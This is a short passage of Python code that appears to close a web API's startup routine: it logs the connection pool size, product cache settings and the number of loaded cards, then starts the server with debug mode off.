    log.info("  Connection pool    : %d", CONN_POOL_LIMIT)
    log.info("  Product cache TTL  : %ds (max %d entries)", PRODUCT_CACHE_TTL, PRODUCT_CACHE_SIZE)
    log.info("  Cards loaded       : %d", len(cards))
    log.info("=" * 55)
    app.run(host="0.0.0.0", port=API_PORT, debug=False, threaded=True)
